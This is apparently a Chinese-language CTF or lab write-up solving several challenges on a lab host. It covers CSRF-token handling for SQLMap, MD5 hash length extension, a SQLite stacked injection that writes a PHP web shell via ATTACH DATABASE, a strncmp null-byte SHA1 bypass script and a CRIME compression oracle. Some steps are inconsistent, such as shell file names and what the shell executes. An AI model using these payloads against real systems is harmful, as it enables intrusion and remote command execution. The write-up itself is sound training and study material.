SQLMap 无法自动处理这种情况，因此我们将使用一个 `--eval` 选项和一个 Python 脚本来创建有效的请求

创建一个名为 `deletecomment.txt` 的文件，内容为 HTTP 请求的原始格式，其中 `csrf` 参数的值用占位符 `replace_me` 标记

```http
POST /deletecomment.php HTTP/1.1
Host: 192.168.187.135
Cookie: PHPSESSID=okmdg60n0cvqerquobnc7lsho3;vip=0

csrf=replace_me&comment_id=1
```

脚本代码如下

```python
import urllib.request
import re

def get_csrf():
    """
    获取当前有效的CSRF令牌。
    通过访问博客页面，从页面JavaScript变量 window.csrf 中提取令牌值。
    返回值为字符串形式的令牌。
    """
    # 构建对博客页面的请求对象，指定 URL
    req = urllib.request.Request('http://192.168.187.135/blog.php?view=2')
    # 添加 Cookie 头
    req.add_header('Cookie', 'PHPSESSID=你的会话ID')

    # 发送请求并获取响应（使用 with 语句自动管理资源）
    with urllib.request.urlopen(req) as response:
        # 读取响应内容（字节流），并用 UTF-8 解码为字符串
        page = response.read().decode('utf-8')

    # 使用正则表达式匹配 window.csrf = '令牌值'; 的形式，提取令牌
    match = re.search(r"window\.csrf = '(.+)';", page)
    if match:
        # 如果匹配成功，返回第一个捕获组（即令牌字符串）
        return match.group(1)
    else:
        # 如果未找到令牌，抛出异常，便于调试
        raise Exception('CSRF token not found')
```

1. 拿到你的参数（比如 `foo=1, bar=2`）

2. 按字母顺序排序并拼接：`bar2foo1`

3. **在前面加上一个只有服务器知道的 `SECRET`**：`SECRETbar2foo1`

4. 计算这个字符串的 **MD5**

如果我们向 `index.php` 文档系统中添加内容，应该能够查看其源代码。但不知道 `SECRET` 是什么

**哈希长度扩展攻击原理：**

简单来说，MD5 是**分块处理**数据的。如果你知道 `MD5(SECRET + 现有数据)` 的值，即使你不知道 `SECRET` 是什么，你也可以在“现有数据”后面接上“新数据”，并算出 `MD5(SECRET + 现有数据 + 填充 + 新数据)`

### Injeption（SQLite SQL 注入 GetShell）

```
Reveal the final flag, which is hidden in the /flag.txt file on the web server.
```

上一题 `cache.php` 里面的源码最后写了，提交的参数 access 的值必须是上一题 flag 的md5

浏览器打开 `cache.php?access=f4fa5dc42fd0b12a098fcc218059e061` 显示的是一个很简单的表单

表单提交了两个参数，URI 和标题，在 `cache.php` 里面对这两个参数严格检查，比如 URI 参数前面必须是 `http://` 开头，服务器必须是本地，然后这个 URI 必须真实存在，不能是 404

标题被限制在 40 字符以内，但是不会过滤引号，似乎可以被注入

我们尝试在标题里提交 `/*` ,返回了错误信息:

```
near "/*', '59ab7c9e3917a154ff56a43d08a262ab','http%3A%2F%2F172.16.1.80%2Findex.php', '...', datetime('now'))": syntax error
```

源码中的 `setCache` 函数直接将变量拼接进 SQL 语句：

```sql
INSERT INTO cache VALUES ('$title', '$key', '$uri', '$data', datetime('now'))
```

虽然 `$key`、`$title`、`$uri` 都有长度限制或编码处理，但 **`$data`** 是通过 `file_get_contents($uri)` 获取的远程/本地页面内容

**这意味着，只要我们能控制 `$uri` 指向的内容，就能控制插入数据库的 `$data`**

SQLite 有个神奇的特性：`ATTACH DATABASE 'file.php' AS a;`。

- 它会创建一个新的数据库文件。如果文件名叫 `test.php`，SQLite 会把它当作数据库处理

- 当我们向这个 `a` 库的表中插入一段 PHP 代码时，这段代码会以**明文**形式存储在该文件中

- **Web 渲染特性：** 当 PHP 解释器访问 `test.php` 时，它会忽略掉 SQLite 的二进制乱码，只执行 `<?php ... ?>` 标签内的代码

第一阶段：构造 Payload

由于我们不能直接在 `title` 或 `uri` 里塞下巨大的 Payload（受长度和 `urlencode` 限制），我们需要利用 `cache.php` 自己的**显示功能**

1. **提交第一个请求：** 在 `uri` 参数里构造包含 SQL 注入语句的字符串。虽然它被编码存储了，但当你在页面上查看缓存列表时，它会被 **原样渲染** 在 HTML 表格里。

2. **Payload 设计：** `test', datetime('now')); ATTACH DATABASE 'test.php' ... --` 这个 Payload 的目的是闭合前面的单引号，然后利用 **分号 (;) 执行堆叠查询**
   
   ```sql
   ',0); ATTACH DATABASE 'a.php' AS a; CREATE TABLE a.b (c text); INSERT INTO a.b VALUES ('<? system($_GET[''cmd'']); ?>');/* 
   ```

第二阶段：触发注入

1. **提交第二个请求：** 这次将 `uri` 指向 `http://host/cache.php`（即页面本身）。

2. **执行流：**
   
   - `setCache` 调用 `file_get_contents('cache.php')`
   
   - 此时 `$data` 拿到了刚才第一步留在页面上的那个 Payload
   
   - SQL 执行变成了：`INSERT INTO cache VALUES (..., '...内容... [Payload] ...内容...', ...)`
   
   - **由于 Payload 包含单引号和分号，它强行切断了原始 INSERT，转而执行了 `ATTACH DATABASE` 和 `INSERT INTO a.tbl`**

第三阶段：收割 Flag

访问 `http://host/test.php`，服务器执行了我们注入的 `file_get_contents('/flag.txt')`，Flag 到手

查看给出的源代码

它接收客户端发送的密码，计算其 SHA1 哈希值，并与预先存储的密钥（从文件中加载）的 SHA1 哈希值进行比较

如果匹配，则返回密钥明文作为奖励；否则返回用户密码的哈希和正确密钥的哈希，让用户知道不匹配

```c
void handle_client(int client_socket)
{
    unsigned char hash[SHA_DIGEST_LENGTH];          // 存储用户输入密码的SHA1哈希值
    unsigned char secret_hash[SHA_DIGEST_LENGTH];   // 存储实际密钥的SHA1哈希值

    char secret_key[256];                            // 存储从文件中加载的密钥（明文）
    char data[256] = {0};                            // 存储客户端发送的密码字符串，初始化为0

    // 向客户端发送欢迎信息并提示输入密码
    sendline(client_socket, "Welcome to the SHA password oracle.\n");
    sendline(client_socket, "Enter your password:");

    // 从客户端接收一行输入（密码），若失败则直接返回
    if (recvline(client_socket, data, sizeof(data)) == -1)
        return;

    // 计算用户输入密码的SHA1哈希值
    SHA1(data, strlen(data), hash);

    // 从文件中加载密钥（明文）并计算其SHA1哈希值
    size_t secret_length = load_flag(secret_key, sizeof(secret_key)); // 加载密钥，返回实际长度
    SHA1(secret_key, secret_length, secret_hash);                     // 计算密钥的哈希

    // 比较两个哈希值（二进制比较），判断密码是否正确
    if (strncmp(secret_hash, hash, SHA_DIGEST_LENGTH) == 0) {
        // 密码正确：构造包含密钥的祝贺消息并发送
        char buf[512] = {0};
        snprintf(buf, sizeof(buf)-1, "Congratulations: The key is %s", secret_key);
        sendline(client_socket, buf);
    } else {
        // 密码错误：将两个哈希值转换为十六进制字符串，发送错误提示
        char secret_hash_str[80] = {0};
        char hash_str[80] = {0};
        char buf[512] = {0};

        // 将二进制哈希值转换为可读的十六进制字符串
        bytes_to_string((unsigned char*)secret_hash, secret_hash_str, sizeof(secret_hash_str));
        bytes_to_string((unsigned char*)hash, hash_str, sizeof(hash_str));

        // 构造错误消息，告知用户其哈希值与正确的哈希值不匹配
        snprintf(buf, sizeof(buf)-1, "Your hash %s does not match the secret hash %s", hash_str, secret_hash_str);
        sendline(client_socket, buf);
    }   

    // 关闭客户端连接
    close(client_socket);
}
```

这里开发者犯了两个个关键错误：

```c
if (strncmp(secret_hash, hash, SHA_DIGEST_LENGTH) == 0)
```

- **函数选择错误**：SHA1 的结果是**二进制字节流**，可能包含 `0x00`。而 `strncmp` 是为 **C 风格字符串** 设计的，它对 `0x00`（Null 终止符）极其敏感

- **错误处理泄露**：在 `else` 分支中，竟然把正确的 `secret_hash` 完整地打印了出来

**漏洞原理：`strncmp` 截断绕过**

`strncmp(s1, s2, n)` 的比较逻辑如下：

- 逐字节对比 $s1[i]$ 和 $s2[i]$

- **停止条件**：
  
  - 发现 $s1[i] \neq s2[i]$（返回非 0，判定失败）
  
  - **在任意一边遇到了 `\x00`**
  
  - 达到了指定的长度 $n$

```python
import hashlib
from pwn import *

# 目标哈希前缀（3B FC 00），以字节形式存储
TARGET_PREFIX = bytes.fromhex("3BFC00")

def solve():
    """
    主函数：不断尝试不同的输入，直到找到 SHA1 哈希值以 TARGET_PREFIX 开头的字符串，
    然后使用该字符串作为密码连接远程服务器
    """
    log.info("正在执行更精准的碰撞：匹配 3B FC 00...")

    count = 0                     # 初始化尝试计数器
    while True:
        # 将计数转换为字节串（例如 b'0', b'1', b'2' ...）作为尝试的输入
        attempt = str(count).encode()
        # 计算 SHA1 哈希值，得到 20 字节的摘要
        current_hash = hashlib.sha1(attempt).digest()

        # 检查哈希值是否以目标前缀开头
        if current_hash.startswith(TARGET_PREFIX):
            # 找到碰撞，输出成功信息及详细数据
            log.success(f"碰撞成功！尝试次数: {count}")
            log.info(f"生成 Hash: {current_hash.hex().upper()}")

            # 连接远程服务器（IP 和端口需根据实际情况修改）
            io = remote('192.168.187.135', 12345)
            # 接收服务器的提示信息，直到遇到 "Enter your password:"
            io.recvuntil(b"Enter your password:")
            # 发送找到的密码（即 attempt）
            io.sendline(attempt)

            # 打印分隔线和服务器返回的所有数据
            print("\n" + "="*40)
            print(io.recvall().decode())
            print("="*40)
            return          # 任务完成，退出函数

        count += 1          # 尝试下一个数字
        # 每尝试 100 万次，输出一次进度，便于观察
        if count % 1000000 == 0:
            log.info(f"已尝试 {count} 次...")

# 如果该脚本作为主程序运行，则调用 solve() 函数
if __name__ == '__main__':
    solve()
```

```python
def encrypt(aes, d):
    """
    使用给定的AES加密对象对数据进行加密，并返回十六进制编码的密文
    """
    return aes.encrypt(d).encode("hex")         # AES加密后转换为十六进制字符串

def handle_client(conn, addr):
    """
    处理客户端连接的主逻辑：
    - 生成随机的AES-256密钥（32字节）和CTR模式的计数器
    - 发送欢迎横幅，其中包含CRIME警告
    - 将固定前缀'Key:'与秘密flag拼接作为SECRET
    - 循环接收客户端数据，每次将SECRET与客户端数据拼接后先压缩再加密，并将结果发回客户端
    - 当客户端不再发送数据时关闭连接
    """
    AESKey = os.urandom(32)                      # 生成32字节（256位）随机AES密钥
    ctr = Counter.new(128)                       # 创建128位CTR模式计数器（通常使用Crypto.Util.Counter）

    aes = AES.new(AESKey, AES.MODE_CTR, counter=ctr)  # 初始化AES-CTR加密对象

    BANNER = "\t\tWelcome to the Keygen server.\n\t\t"
    BANNER += "=" * 30
    BANNER += "\n[+]All access is monitored and any unauthorised access will be treated as CRIME\n"
    conn.send(BANNER)                            # 发送欢迎信息

    SECRET = 'Key:' + helpers.load_flag()         # 将固定前缀和flag拼接成待保护的秘密字符串

    data = conn.recv(2048).strip()                # 首次接收客户端数据（最多2048字节），去除两端空白

    while len(data):                              # 只要收到非空数据就循环处理
        data = compress(SECRET + data)            # 将秘密与用户输入拼接后压缩
        data = encrypt(aes, data)                 # 压缩结果加密
        conn.send(data)                            # 将密文发送给客户端
        data = conn.recv(2048).strip()             # 接收下一段客户端数据

    conn.close()                                   # 客户端不再发送数据时关闭连接
```

关键代码

```python
SECRET = 'Key:' + helpers.load_flag()  # 例如 SECRET = "Key:DrizzleVerandaFinger576"
data = compress(SECRET + data)          # 压缩：SECRET + 客户端输入
data = encrypt(aes, data)              # AES-CTR加密
conn.send(data)                        # 返回加密后的十六进制字符串
```

**核心操作**：

1. 服务器将 `SECRET`（含flag）与客户端输入拼接
2. 用 `zlib` 压缩拼接后的字符串
3. 用 AES-CTR 加密压缩后的数据
4. 返回加密后的十六进制字符串

**漏洞类型**：CRIME

**为什么漏洞存在**？

- `zlib` 压缩算法对**重复字符串**高度敏感（例如，重复10次字符串可压缩为1字节）
- 当 `SECRET + input` 包含重复字符串时，压缩后数据长度**显著缩短**。
- **关键点**：攻击者通过观察**响应长度**（加密后长度 = 压缩后长度），可推断 `SECRET` 内容

| 客户端输入   | 拼接后明文（SECRET + 输入）    | 压缩效果            | 响应长度 |
| ------- | --------------------- | --------------- | ---- |
| `Key:`  | `Key:Drizzle...Key:`  | 重复"Key:" → 长度短  | 128  |
| `Key:A` | `Key:Drizzle...Key:A` | 无重复 → 长度正常      | 133  |
| `Key:D` | `Key:Drizzle...Key:D` | 重复"Key:D" → 长度短 | 128  |

```python
from pwn import *
import re

# 1. 设置目标服务器的 IP 和 端口
HOST = '192.168.187.135'
PORT = 5050

def solve():
    # 与服务器建立连接
    io = remote(HOST, PORT)

    try:
        # 题目要求连续完成 50 轮
        for i in range(1, 51):
            log.info(f"--- 正在挑战第 {i} 轮 ---")

            # 【接收数据】读取服务器的回显，直到出现输入提示符
            # 这段 data 包含了 Wordlist 和 Jumbled word
            data = io.recvuntil(b"Enter unjumbled word:").decode()

            # 【提取数据】利用正则表达式精准定位我们要的两个关键信息
            # 匹配 Wordlist: ['...', '...'] 括号里的内容
            wordlist_raw = re.search(r"Wordlist: \[(.*?)\]", data).group(1)
            # 匹配 Jumbled word: xxxx 后面的单词
            jumbled_word = re.search(r"Jumbled word: (\w+)", data).group(1).strip()

            # 【处理格式】把抓取到的字符串 " 'a', 'b' " 转换成 Python 列表 ['a', 'b']
            candidate_list = wordlist_raw.replace("'", "").split(", ")

            log.info(f"乱序词是: {jumbled_word}")

            # 【核心算法】寻找正确答案
            # 原理：如果两个单词字母组成一样，那么它们按照字母表排序（sorted）后，结果一定相等
            # 例如：'apple' -> ['a', 'l', 'p', 'p', 'e']，'elppa' -> ['a', 'l', 'p', 'p', 'e']
            answer = ""
            sorted_target = sorted(jumbled_word) # 先把乱序词排好序

            for word in candidate_list:
                if sorted(word) == sorted_target: # 遍历备选词，看谁排好序后长得一样
                    answer = word
                    break

            # 【回传答案】找到答案后，立刻发回给服务器
            if answer:
                log.success(f"匹配成功！发送答案: {answer}")
                io.sendline(answer.encode()) # 发送答案并换行
            else:
                log.error("在列表中没找到对应的词，请检查正则逻辑！")
                break

        # 50 轮全部成功后，服务器会吐出 Flag
        # 我们一次性读取剩下的所有内容
        print("\n" + "="*30)
        print("[*] 50 轮完成！正在等待 Flag...")
        print(io.recvall().decode())
        print("="*30)

    except Exception as e:
        log.error(f"运行出错: {e}")
    finally:
        io.close()

if __name__ == "__main__":
    solve()
```
